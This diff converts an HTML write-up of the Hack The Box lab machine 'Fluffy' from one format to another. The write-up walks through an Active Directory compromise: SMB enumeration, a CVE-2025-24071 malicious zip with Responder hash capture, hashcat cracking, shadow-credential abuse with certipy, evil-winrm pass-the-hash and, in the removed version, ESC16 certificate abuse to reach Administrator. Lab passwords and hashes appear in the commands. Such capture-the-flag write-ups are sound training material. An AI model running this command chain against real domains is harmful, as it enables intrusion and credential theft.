@@ -1,130 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HTB Fluffy Writeup</title>
+</head>
+<body>
 
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HTB FLUFFY</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-<link rel="stylesheet"
-href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"/>
+    <h1>HTB FLUFFY</h1>
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-html{scroll-behavior:smooth;}
-body{
-    background:#0a0a0a;
-    color:#e5e5e5;
-    font-family:Arial,Helvetica,sans-serif;
-    line-height:1.8;
-    max-width:1100px;
-    margin:auto;
-    padding:40px 28px;
-}
-.page{width:100%;}
-.page-body{max-width:1000px;margin:auto;}
-header{margin-bottom:45px;}
-.page-title{
-    font-size:3rem;
-    font-weight:700;
-    color:#fff;
-    margin:0 0 20px;
-    border-bottom:2px solid #1f1f1f;
-    padding-bottom:20px;
-}
-h1,h2,h3,h4{
-    color:#fff;
-    margin-top:45px;
-    margin-bottom:18px;
-    line-height:1.3;
-}
-h1{font-size:2.1rem;}
-h2{
-    font-size:1.9rem;
-    border-left:4px solid #444;
-    padding-left:14px;
-}
-h3{font-size:1.4rem;color:#d4d4d4;}
-h4{font-size:1.15rem;color:#c0c0c0;}
-p{margin:16px 0;color:#d1d1d1;}
-a{
-    color:#cfcfcf;
-    text-decoration:none;
-    border-bottom:1px solid #555;
-    transition:.2s ease;
-}
-a:hover{color:#fff;border-color:#fff;}
-code{
-    font-family:"JetBrains Mono","SFMono-Regular",Consolas,monospace;
-    background:#1a1a1a;
-    color:#f5f5f5;
-    padding:3px 7px;
-    border-radius:6px;
-    border:1px solid #242424;
-    font-size:.9rem;
-}
-pre{
-    background:#111!important;
-    border:1px solid #232323;
-    border-radius:14px;
-    padding:22px!important;
-    overflow-x:auto;
-    margin:28px 0;
-    box-shadow:0 0 0 1px rgba(255,255,255,.02),0 10px 25px rgba(0,0,0,.35);
-}
-pre code{
-    background:transparent;
-    border:none;
-    padding:0;
-    color:#f5f5f5;
-    font-size:.9rem;
-    line-height:1.65;
-}
-figure{margin:35px 0;}
-figure img{
-    display:block;
-    width:100%!important;
-    height:auto;
-    border-radius:16px;
-    border:1px solid #232323;
-    box-shadow:0 15px 35px rgba(0,0,0,.45),0 0 0 1px rgba(255,255,255,.03);
-    transition:.25s ease;
-}
-figure img:hover{transform:scale(1.01);}
-ul,ol{padding-left:24px;margin:18px 0;}
-li{margin-bottom:10px;}
-blockquote{
-    background:#111;
-    border-left:4px solid #555;
-    padding:20px;
-    margin:28px 0;
-    border-radius:12px;
-    color:#d1d1d1;
-}
-table{
-    width:100%;
-    border-collapse:collapse;
-    margin:30px 0;
-}
-th{background:#141414;color:#fff;}
-td,th{border:1px solid #2a2a2a;padding:14px;}
-td{background:#0f0f0f;}
-hr{border:none;height:1px;background:#1f1f1f;margin:50px 0;}
-.page-description{color:#aaa;}
-img{max-width:100%;}
-::selection{background:#444;color:#fff;}
-::-webkit-scrollbar{width:10px;}
-::-webkit-scrollbar-track{background:#0a0a0a;}
-::-webkit-scrollbar-thumb{background:#2d2d2d;border-radius:10px;}
-::-webkit-scrollbar-thumb:hover{background:#444;}
-@media(max-width:768px){
-    body{padding:24px 18px;}
-    .page-title{font-size:2.2rem;}
-    h1{font-size:1.8rem;}
-    h2{font-size:1.5rem;}
-    pre{padding:18px!important;}
-}
-</style>
-</head><body><article id="3b3163ac-bbad-801d-a31d-c704771709af" class="page sans"><header><h1 class="page-title" dir="auto">HTB FLUFFY</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><h1 id="3bb163ac-bbad-8006-9c1d-efe5b51ee3ff" class="" dir="auto">Scanning/Recon</h1><h2 id="3bc163ac-bbad-80e4-aad3-f453c7444c04" class="" dir="auto">Nmap</h2><p id="3bb163ac-bbad-80b7-a9de-de5415001b77" class="" dir="auto">Lets run nmap against to identify open ports and services</p><pre id="3bb163ac-bbad-8045-8262-e97b9bad2e7d" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">nmap -A -Pn -p- 10.129.232.88 -oN 10.129.232.88_scan-result.txt</code></pre><p id="3bb163ac-bbad-8043-a1c6-cd46ca2ec253" class="" dir="auto">Result:</p><figure id="3bb163ac-bbad-80a7-a0f1-e39873345602" class="image" data-notion-image="image.png" dir="ltr"><a href="image.png"><img src="image.png"/></a></figure><figure id="3bb163ac-bbad-800d-b797-ef38324717a1" class="image" data-notion-image="image%201.png" dir="ltr"><a href="image%201.png"><img src="image%201.png"/></a></figure><p id="3bb163ac-bbad-80ea-a9df-e51eebdbac63" class="" dir="auto">We discovered a bunch of open ports, port 445 and 139 means the host is running SMB and there are other ports like 636 and 3269 which indicate that the host is part of a domain called <code>fluffy.htb</code>, also given the name <code>DC01.fluffy.htb</code>, we can assume the target is a domain controller.</p><h2 id="3bb163ac-bbad-809c-9a72-d91816f9765c" class="" dir="auto">SMB shares enumeration</h2><p id="3bb163ac-bbad-80ec-a00b-f4615a7aab47" class="" dir="auto">Lets try listing the available shares with no authentication using smbclient</p><pre id="3bb163ac-bbad-8053-9afb-c71827908a4a" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">smbclient -N -L //10.129.14.128</code></pre><p id="3bb163ac-bbad-800c-8df5-e5d87e7aef44" class="" dir="auto">Output:</p><figure id="3bb163ac-bbad-80f4-872d-c5c22c53a1eb" class="image" data-notion-image="image%202.png" dir="ltr"><a href="image%202.png"><img src="image%202.png"/></a></figure><p id="3bb163ac-bbad-80e0-99be-ca76f0c3b5d8" class="" dir="auto">Using the provided ceredentials: j.fleischman / J0elTHEM4n1990! lets authenticate to the IT share.</p><p id="3bb163ac-bbad-8032-8fea-eea12135aa05" class="" dir="auto">But first, let’s check what permissions we have over each share using smbmap.</p><h3 id="3bb163ac-bbad-80b3-83dd-cb7a9919cf02" class="" dir="auto">Shares permissions</h3><pre id="3bb163ac-bbad-80ad-9e3c-f1512846fbfe" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">smbmap -u j.fleischman -p J0elTHEM4n1990! -H 10.129.232.88</code></pre><p id="3bb163ac-bbad-804f-a683-c46ba7d0c038" class="" dir="auto">Output:</p><p id="3bb163ac-bbad-80ab-a634-c9c316cba865" class="" dir="auto">Nice we have READ and WRITE permissions over the IT share.</p><figure id="3bb163ac-bbad-8073-8935-cd63c12de327" class="image" data-notion-image="image%203.png" dir="ltr"><a href="image%203.png"><img src="image%203.png"/></a></figure><p id="3bb163ac-bbad-80b5-8d4a-e8bda1535f71" class="" dir="auto">Now lets authenticate to the share.</p><pre id="3bb163ac-bbad-80ac-a56d-f5291b47985e" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">smbclient //10.129.232.88/IT -U j.fleischman</code></pre><figure id="3bb163ac-bbad-804a-a94b-c2d57c5016a8" class="image" data-notion-image="image%204.png" dir="ltr"><a href="image%204.png"><img src="image%204.png"/></a></figure><p id="3bb163ac-bbad-80a1-ac74-f2b510b9a1eb" class="" dir="auto">We have some directories, some zip files and a pdf file.</p><p id="3bb163ac-bbad-805c-a80e-cc46c1dd914f" class="" dir="auto">After entering those directories and doing some research on the names, i discovered that those are tools/apps used in windows.</p><figure id="3bb163ac-bbad-805f-a270-c48f74d59b81" class="image" data-notion-image="image%205.png" dir="ltr"><a href="image%205.png"><img src="image%205.png"/></a></figure><figure id="3bb163ac-bbad-8003-acbf-d9b1b5913489" class="image" data-notion-image="image%206.png" dir="ltr"><a href="image%206.png"><img src="image%206.png"/></a></figure><p id="3bb163ac-bbad-8042-8997-e7811aca247d" class="" dir="auto">So i decided to download and check out the pdf file.</p><figure id="3bb163ac-bbad-8042-afdc-d935b4edecf7" class="image" data-notion-image="image%207.png" dir="ltr"><a href="image%207.png"><img src="image%207.png"/></a></figure><p id="3bb163ac-bbad-807a-b404-ececfc74a3c6" class="" dir="auto">Summary of the file is that the It department should upgrade the systems so they are not vulnerable to the most recent vulnerabilities and the vulnerabilities were listed as well.</p><figure id="3bb163ac-bbad-8036-ad67-f2bbd139a9c4" class="image" data-notion-image="image%208.png" dir="ltr"><a href="image%208.png"><img src="image%208.png"/></a></figure><h2 id="3bb163ac-bbad-8009-9ad9-caef8c78aab8" class="" dir="auto">Vulnerabilities Research</h2><p id="3bb163ac-bbad-80fe-b025-f68240520335" class="" dir="auto">I looked up the CVE’s and the one the showed the most promise for grant me a foothold was the second critical vulnerability <strong>CVE-2025-24071.</strong></p><figure id="3bb163ac-bbad-8007-9940-f5c954bddc2c" class="image" data-notion-image="image%209.png" dir="ltr"><a href="image%209.png"><img src="image%209.png"/></a></figure><p id="3bb163ac-bbad-8011-9137-e2df937e42e9" class="" dir="auto">PoC check:</p><figure id="3bb163ac-bbad-809f-8cdc-c42b40ff6180" class="image" data-notion-image="image%2010.png" dir="ltr"><a href="image%2010.png"><img src="image%2010.png"/></a></figure><p id="3bb163ac-bbad-8070-b042-e05e65daaa70" class="" dir="auto">I clicked on the third link which led me to this blog that explained the exploitation process: <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">https://cti.monster/blog/2025/03/18/CVE-2025-24071.html</a>.</p><p id="3bb163ac-bbad-808c-9e90-cf75a48cd4a1" class="" dir="auto">Copied the exploit code, generated the malicious zip file. </p><figure id="3bb163ac-bbad-8006-b036-e4604f6689cd" class="image" data-notion-image="image%2011.png" dir="ltr"><a href="image%2011.png"><img src="image%2011.png"/></a></figure><p id="3bb163ac-bbad-8084-9e55-e3509299fc79" class="" dir="auto">Before we upload the malicious zip file to the host via adding it to the SMB file share, lets start Responder to capture the hash(es).</p><h3 id="3bb163ac-bbad-8033-bd43-c800d7219d89" class="" dir="auto">Hash Capture With Responder</h3><pre id="3bb163ac-bbad-8082-97d4-ccf27014fb94" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo responder -I tun0</code></pre><p id="3bb163ac-bbad-800f-acde-cc322c1f5f30" class="" dir="auto">Upload the zip file</p><figure id="3bb163ac-bbad-805c-a04d-f2fd4ed2c112" class="image" data-notion-image="image%2012.png" dir="ltr"><a href="image%2012.png"><img src="image%2012.png"/></a></figure><p id="3bb163ac-bbad-8071-8095-fc67a2e9f36c" class="" dir="auto">Our exploit worked and we captured a NTLM hash.</p><figure id="3bb163ac-bbad-8070-a932-d84824083315" class="image" data-notion-image="image%2013.png" dir="ltr"><a href="image%2013.png"><img src="image%2013.png"/></a></figure><h3 id="3bb163ac-bbad-80d4-a700-cbebe86486cc" class="" dir="auto">Hash Cracking</h3><p id="3bb163ac-bbad-8083-9a3f-c162199e63be" class="" dir="auto">I pasted the hash into a file named hash.txt and we’ll use hashcat to try to crack the NTLM hash.</p><pre id="3bb163ac-bbad-8039-b61e-c9aef2854534" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre><p id="3bb163ac-bbad-8008-938b-f4859696407e" class="" dir="auto">Cracking successful:</p><figure id="3bb163ac-bbad-80c8-b9b1-f8c183cac655" class="image" data-notion-image="image%2014.png" dir="ltr"><a href="image%2014.png"><img src="image%2014.png"/></a></figure><p id="3bb163ac-bbad-8021-a498-f7b32eefbcf5" class="" dir="auto">Now we have a new set of creds: p.agila / prometheusx-303</p><p id="3bc163ac-bbad-80c8-84cc-c890ff3ba20f" class="" dir="auto"><em><span style="border-bottom:0.05em solid">Note: My target ip address changed for this part because I had to reset the target. but i  returned to using the previous ip in the privelege esclation part.</span></em></p><p id="3bb163ac-bbad-80ae-80cf-d92e003b0124" class="" dir="auto">Lets test them using CrackMapExec</p><pre id="3bb163ac-bbad-8064-af25-c0a114f25d37" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo crackmapexec smb 10.129.62.146 -u p.agila -p prometheusx-303</code></pre><figure id="3bb163ac-bbad-802a-b425-f13369ef6640" class="image" data-notion-image="image%2015.png" dir="ltr"><a href="image%2015.png"><img src="image%2015.png"/></a></figure><h2 id="3bb163ac-bbad-80e7-92c1-db6913d130cc" class="" dir="auto">Domain Enumeration</h2><p id="3bb163ac-bbad-8067-8ed6-d547afe17ae4" class="" dir="auto">Lets get all available info about the domain and analyze it using bloodhound.</p><p id="3bb163ac-bbad-8078-97ee-e9106050ffa4" class="" dir="auto">Firstly we run the bloodhound-python ingestor with the <code>-all</code> flag to perform all checks.</p><pre id="3bb163ac-bbad-80c4-8794-cc7382976171" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo bloodhound-python -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -ns 10.129.62.146 -d fluffy.htb -c all</code></pre><p id="3bb163ac-bbad-8028-940e-f2788927d552" class="" dir="auto">The results are in json files so we run the next command to put tham all in one zip file</p><pre id="3bb163ac-bbad-805e-878e-e874c6d2a3e5" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">zip -r fluffy_htb.zip *.json</code></pre><p id="3bb163ac-bbad-808c-a152-d7f3c2347a90" class="" dir="auto">Next we start the bloodhoud app:</p><pre id="3bb163ac-bbad-802e-9b05-e7da238d528a" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">bloodhound</code></pre><p id="3bb163ac-bbad-8054-9e37-c8680291df3f" class="" dir="auto">After we uploaded the zip file or all the json files, we then type <code>domain:</code> in the search bar and select the fluffy.htb domain to perform analysis:</p><figure id="3bb163ac-bbad-80c6-b054-da4e162323fa" class="image" data-notion-image="image%2016.png" dir="ltr"><a href="image%2016.png"><img src="image%2016.png"/></a></figure><p id="3bb163ac-bbad-80ee-9e75-cb4b9327a93b" class="" dir="auto">After going to the analysis tab and clicking <code>Find Shortest Paths to Domain Admins</code> , we see that there is a path from one of our owned users p.agila.</p><figure id="3bb163ac-bbad-80d7-9bf0-d5ec60d445e4" class="image" data-notion-image="image%2017.png" dir="ltr"><a href="image%2017.png"><img src="image%2017.png"/></a></figure><p id="3bb163ac-bbad-80b8-b789-efbf23b17cb7" class="" dir="auto">After more analysis, I found out that our user is part of the Service Account Managers group which has <code>GenericAll</code> privileges over the Service Accounts group.</p><p id="3bb163ac-bbad-8089-b06e-e86bc7502902" class="" dir="auto">The Service Account group has <code>GenericWrite</code> privileges over the members of that group, and one of the members namely <code>ca_svc</code> is a member of the Cert Publisher’s group. <code>winrm_svc</code> user is a part of the Remote Management Users.</p><h2 id="3bb163ac-bbad-8010-adc9-cdef4fb2816c" class="" dir="auto">Foothold</h2><p id="3bb163ac-bbad-803c-b893-f40ff1528a07" class="" dir="auto">Using the <code>GenericAll</code> privilege, we add p.agilla to the Service Accounts group using the below command:</p><pre id="3bb163ac-bbad-805c-bba7-db24dfe39569" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">net rpc group addmem &quot;Service Accounts&quot; &quot;p.agila&quot; -U &quot;FLUFFY.HTB&quot;/&quot;p.agila&quot;%&quot;prometheusx-303&quot; -S &quot;10.129.62.146&quot;</code></pre><p id="3bb163ac-bbad-8038-8ddc-c245dd29dabc" class="" dir="auto">Then we verify that the user was successfully added to the group:</p><pre id="3bb163ac-bbad-80a5-852c-f4c12f54866a" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">net rpc group members &quot;Service Accounts&quot; -U &quot;FLUFFY.HTB&quot;/&quot;p.agila&quot;%&quot;prometheusx-303&quot; -S &quot;10.129.62.146&quot;</code></pre><figure id="3bb163ac-bbad-80e7-819b-ff75bf95e1b7" class="image" data-notion-image="image%2018.png" dir="ltr"><a href="image%2018.png"><img src="image%2018.png"/></a></figure><p id="3bb163ac-bbad-800a-ab4d-ec4e9d2f6fd2" class="" dir="auto">Then, as a member of the Service Accounts group, we should be able to add shadow credentials to the winrm_svc and ca_svc users to retrieve their RC4 password hash because of the <code>GenericWrite</code> privilege.</p><p id="3bb163ac-bbad-80db-b3f0-cd3c7e14d4d1" class="" dir="auto">For this, we can use certipy.</p><h4 id="3bb163ac-bbad-80fc-8a5b-db273cefadb2" class="" dir="auto">Generating Hashes using Certipy</h4><pre id="3bb163ac-bbad-808c-b2e9-d19e4463f121" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">certipy-ad shadow auto -username p.agila@fluffy.htb -password &#x27;prometheusx-303&#x27; -account ca_svc -target-ip 10.129.62.146</code></pre><p id="3bb163ac-bbad-80be-af4e-e2f2cee693c7" class="" dir="auto"><em><span style="border-bottom:0.05em solid">Note: we might get an error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), to fix this we run command:</span></em></p><pre id="3bb163ac-bbad-8069-a391-fa3774be550b" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo ntpdate &lt;dc&gt; #replace dc with ip</code></pre><figure id="3bb163ac-bbad-8058-a4ca-f086faf43247" class="image" data-notion-image="image%2019.png" dir="ltr"><a href="image%2019.png"><img src="image%2019.png"/></a></figure><p id="3bb163ac-bbad-804e-8cf8-c4f3dc8649b2" class="" dir="auto">We repeat this for the remaining accounts as well. ldap_svc and winrm_svc</p><h4 id="3bb163ac-bbad-80c7-b5df-d11f32778155" class="" dir="auto">User Flag</h4><p id="3bb163ac-bbad-80dd-95d6-d5aed2d8a75b" class="" dir="auto">We use the winrm_svc user account to get a shell on the host using evil-winrm.</p><pre id="3bb163ac-bbad-80ca-bf90-d960d816a265" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">evil-winrm -u &#x27;winrm_svc&#x27; -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.62.146</code></pre><figure id="3bb163ac-bbad-8008-a5e8-e09623a50b30" class="image" data-notion-image="image%2020.png" dir="ltr"><a href="image%2020.png"><img src="image%2020.png"/></a></figure><figure id="3bb163ac-bbad-8085-b3ef-c803e8ec132d" class="image" data-notion-image="image%2021.png" dir="ltr"><a href="image%2021.png"><img src="image%2021.png"/></a></figure><h2 id="3bb163ac-bbad-8054-9c57-eb544e17c166" class="" dir="auto">Privilege Escalation/Root Flag</h2><p id="3bb163ac-bbad-8066-98c4-d350c9a75e13" class="" dir="auto">ADCS is installed on the Domain Controller. we should search for vulnerabilities using ca_svc’s creds and certipy tool:</p><figure id="3b3163ac-bbad-806c-8c78-e5267af86b51" class="image" data-notion-image="image%2022.png" dir="ltr"><a href="image%2022.png"><img src="image%2022.png"/></a></figure><figure id="3b3163ac-bbad-80d5-b931-e69bc652a184" class="image" data-notion-image="image%2023.png" dir="ltr"><a href="image%2023.png"><img src="image%2023.png"/></a></figure><p id="3bc163ac-bbad-8048-b435-ece0370f7b25" class="" dir="auto">I then googled ESC16 vulnerability and followed the step in the third article/blog:</p><figure id="3bc163ac-bbad-800a-ae5b-c273fb0dbeb7" class="image" data-notion-image="image%2024.png" dir="ltr"><a href="image%2024.png"><img src="image%2024.png"/></a></figure><h3 id="3bc163ac-bbad-807f-adec-dec680c5d6c0" class="" dir="auto">Steps</h3><p id="3b3163ac-bbad-8077-a7ab-eb8232e82fb2" class="" dir="auto">Read upn for ca_svc</p><pre id="3b3163ac-bbad-8044-b9e6-cf21102fd6aa" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">certipy account -u &#x27;p.agila@fluffy.htb&#x27; -p prometheusx-303 -user ca_svc -dc-ip 10.129.232.88 read</code></pre><figure id="3b3163ac-bbad-807e-8c89-f7f5d5b8fb23" class="image" data-notion-image="image%2025.png" dir="ltr"><a href="image%2025.png"><img src="image%2025.png"/></a></figure><p id="3b3163ac-bbad-80aa-8f73-e6cbbbb611bb" class="" dir="auto"><strong>Change ca_svc’s UPN to Administrator</strong></p><pre id="3b3163ac-bbad-80fb-9c3f-c271bdf749e1" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">certipy account -u &#x27;p.agila@fluffy.htb&#x27; -p prometheusx-303 -upn administrator -user ca_svc -dc-ip 10.129.232.88 update</code></pre><figure id="3b3163ac-bbad-80f8-81fc-fdcd08bf3c94" class="image" data-notion-image="image%2026.png" dir="ltr"><a href="image%2026.png"><img src="image%2026.png"/></a></figure><p id="3b3163ac-bbad-8004-8ff4-ddb3af78e0cf" class="" dir="auto"><strong>Request Certificate as Administrator</strong></p><pre id="3b3163ac-bbad-80da-bcbd-f0d10a5d04c0" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -ca &#x27;FLUFFY-DC01-CA&#x27; -template &#x27;User&#x27;</code></pre><figure id="3b3163ac-bbad-80c7-bb85-f395b573732a" class="image" data-notion-image="image%2027.png" dir="ltr"><a href="image%2027.png"><img src="image%2027.png"/></a></figure><p id="3b3163ac-bbad-8025-9251-d8ac18a47e23" class="" dir="auto"><strong>Restore ca_svc’s Original UPN</strong></p><pre id="3b3163ac-bbad-801c-8cd2-e8b8e06efa15" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">certipy account -u &#x27;p.agila@fluffy.htb&#x27; -p prometheusx-303 -upn ca_svc -user ca_svc -dc-ip 10.129.232.88 update</code></pre><figure id="3b3163ac-bbad-8050-b9e3-ca9b5f4979fa" class="image" data-notion-image="image%2028.png" dir="ltr"><a href="image%2028.png"><img src="image%2028.png"/></a></figure><figure id="3b3163ac-bbad-8017-aa83-f968d1b8e049" class="image" data-notion-image="image%2029.png" dir="ltr"><a href="image%2029.png"><img src="image%2029.png"/></a></figure><pre id="3b3163ac-bbad-80d2-8b9f-ee5891dada4f" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain &#x27;fluffy.htb&#x27;</code></pre><figure id="3b3163ac-bbad-8044-b072-ca9daadca3de" class="image" data-notion-image="image%2030.png" dir="ltr"><a href="image%2030.png"><img src="image%2030.png"/></a></figure><p id="3b3163ac-bbad-80ad-a6a8-f107229ce209" class="" dir="auto">Log in and read root flag</p><pre id="3b3163ac-bbad-80cf-b942-c53c20d61855" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e</code></pre><figure id="3b3163ac-bbad-805c-9490-e4bc2a354265" class="image" data-notion-image="image%2031.png" dir="ltr"><a href="image%2031.png"><img src="image%2031.png"/></a></figure><p id="3bc163ac-bbad-80af-97c5-eb1e9d08cd96" class="" dir="auto">
-</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
-</body></html>
+    <h2>Scanning/Recon</h2>
+    <h3>Nmap</h3>
+    <p>Lets run nmap against to identify open ports and services</p>
+    <pre><code>nmap -A -Pn -p- 10.129.232.88 -oN 10.129.232.88_scan-result.txt</code></pre>
+    
+    <p>Result:</p>
+    <p>We discovered a bunch of open ports, port 445 and 139 means the host is running SMB and there are other ports like 636 and 3269 which indicate that the host is part of a domain called fluffy.htb , also given the name DC01.fluffy.htb , we can assume the target is a domain controller.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image1.png" alt="Nmap Scan Results">
+
+    <h2>SMB shares enumeration</h2>
+    <p>Lets try listing the available shares with no authentication using smbclient</p>
+    <pre><code>smbclient -N -L //10.129.14.128</code></pre>
+    
+    <p>Output:</p>
+    <p>Using the provided ceredentials: j.fleischman / J0elTHEM4n1990! lets authenticate to the IT share.</p>
+    <p>But first, let's check what permissions we have over each share using smbmap.</p>
+
+    <h3>Shares permissions</h3>
+    <pre><code>smbmap -u j.fleischman -p J0elTHEM4n1990! -H 10.129.232.88</code></pre>
+    
+    <p>Output:</p>
+    <p>Nice we have READ and WRITE permissions over the IT share.</p>
+    <p>Now lets authenticate to the share.</p>
+    <pre><code>smbclient //10.129.232.88/IT -U j.fleischman</code></pre>
+    <p>We have some directories, some zip files and a pdf file.</p>
+    <p>After entering those directories and doing some research on the names, i discovered that those are tools/apps used in windows.</p>
+    <p>So i decided to download and check out the pdf file.</p>
+    <p>Summary of the file is that the It department should upgrade the systems so they are not vulnerable to the most recent vulnerabilities and the vulnerabilities were listed as well.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image2.png" alt="SMB Enumeration and PDF file">
+
+    <h2>Vulnerabilities Research</h2>
+    <p>I looked up the CVE's and the one the showed the most promise for grant me a foothold was the second critical vulnerability <strong>CVE-2025-24071.</strong></p>
+    <p>PoC check:</p>
+    <p>I clicked on the third link which led me to this blog that explained the exploitation process: https://cti.monster.</p>
+    <p>Copied the exploit code, generated the malicious zip file.</p>
+    <p>Before we upload the malicious zip file to the host via adding it to the SMB file share, lets start Responder to capture the hash(es).</p>
+
+    <h3>Hash Capture With Responder</h3>
+    <pre><code>sudo responder -I tun0</code></pre>
+    <p>Upload the zip file</p>
+    <p>Our exploit worked and we captured a NTLM hash.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image3.png" alt="Responder Hash Capture">
+
+    <h3>Hash Cracking</h3>
+    <p>I pasted the hash into a file named hash.txt and we'll use hashcat to try to crack the NTLM hash.</p>
+    <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+    <p>Cracking successful:</p>
+    <p>Now we have a new set of creds: p.agila / prometheusx-303</p>
+    <p><em>Note: My target ip address changed for this part because I had to reset the target. but i returned to using the previous ip in the privelege esclation part.</em></p>
+    <p>Lets test them using CrackMapExec</p>
+    <pre><code>sudo crackmapexec smb 10.129.62.146 -u p.agila -p prometheusx-303</code></pre>
+    <img src="../../../assets/writeups/htb/Fluffy/image4.png" alt="Hashcat and CrackMapExec">
+
+    <h2>Domain Enumeration</h2>
+    <p>Lets get all available info about the domain and analyze it using bloodhound.</p>
+    <p>Firstly we run the bloodhound-python ingestor with the -all flag to perform all checks.</p>
+    <pre><code>sudo bloodhound-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.62.146 -d fluffy.htb -c all</code></pre>
+    <p>The results are in json files so we run the next command to put tham all in one zip file</p>
+    <pre><code>zip -r fluffy_htb.zip *.json</code></pre>
+    <p>Next we start the bloodhoud app:</p>
+    <pre><code>bloodhound</code></pre>
+    <p>After we uploaded the zip file or all the json files, we then type domain: in the search bar and select the fluffy.htb domain to perform analysis:</p>
+    <p>After going to the analysis tab and clicking Find Shortest Paths to Domain Admins , we see that there is a path from one of our owned users p.agila.</p>
+    <p>After more analysis, I found out that our user is part of the Service Account Managers group which has GenericAll privileges over the Service Accounts group.</p>
+    <p>The Service Account group has GenericWrite privileges over the members of that group, and one of the members namely ca_svc is a member of the Cert Publisher's group. winrm_svc user is a part of the Remote Management Users.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image5.png" alt="BloodHound Analysis">
+
+    <h2>Foothold</h2>
+    <p>Using the GenericAll privilege, we add p.agilla to the Service Accounts group using the below command:</p>
+    <pre><code>net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "10.129.62.146"</code></pre>
+    <p>Then we verify that the user was successfully added to the group:</p>
+    <pre><code>net rpc group members "Service Accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "10.129.62.146"</code></pre>
+    <p>Then, as a member of the Service Accounts group, we should be able to add shadow credentials to the winrm_svc and ca_svc users to retrieve their RC4 password hash because of the GenericWrite privilege.</p>
+    <p>For this, we can use certipy.</p>
+
+    <h4>Generating Hashes using Certipy</h4>
+    <pre><code>certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc -target-ip 10.129.62.146</code></pre>
+    <p><em>Note: we might get an error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), to fix this we run command:</em></p>
+    <pre><code>sudo ntpdate &lt;dc&gt; #replace dc with ip</code></pre>
+    <p>We repeat this for the remaining accounts as well. ldap_svc and winrm_svc</p>
+
+    <h4>User Flag</h4>
+    <p>We use the winrm_svc user account to get a shell on the host using evil-winrm.</p>
+    <pre><code>evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.62.146</code></pre>
+    <img src="../../../assets/writeups/htb/Fluffy/image6.png" alt="Certipy and User Flag Shell">
+
+    <h2>Privilege Escalation/Root Flag</h2>
+    <p>ADCS is installed on the Domain Controller. we should search for vulnerabilities using ca_svc's creds and certipy tool:</p>
